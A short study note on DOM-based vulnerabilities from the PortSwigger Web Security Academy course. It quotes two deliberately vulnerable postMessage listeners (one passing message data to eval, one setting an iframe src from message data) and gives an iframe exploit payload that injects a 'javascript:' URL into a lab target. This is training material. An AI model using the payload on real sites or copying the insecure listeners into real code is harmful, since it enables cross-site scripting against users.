# DOM Based Vulnerability

course link: https://portswigger.net/web-security/dom-based

* Reflected data
* Stored data
* Web messages: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
  * The key is when website has eventListener that listen to window.postMessage
  ```html
    window.addEventListener('message', function(e) {
      if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
      }
    });
  ```
  you can use `iframe` to send message to exploit the DOM-based vulnerabilities

  e.g.
  target website has this:

  ```html
      window.addEventListener('message', function(e) {
          var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
          document.body.appendChild(iframe);
          try {
              d = JSON.parse(e.data);
          } catch(e) {
              return;
          }
          switch(d.type) {
              case "page-load":
                  ACMEplayer.element.scrollIntoView();
                  break;
              case "load-channel":
                  ACMEplayer.element.src = d.url;
                  break;
          }
      }, false);
  ```
  
  you can do this:

  ```html
    <iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
  ```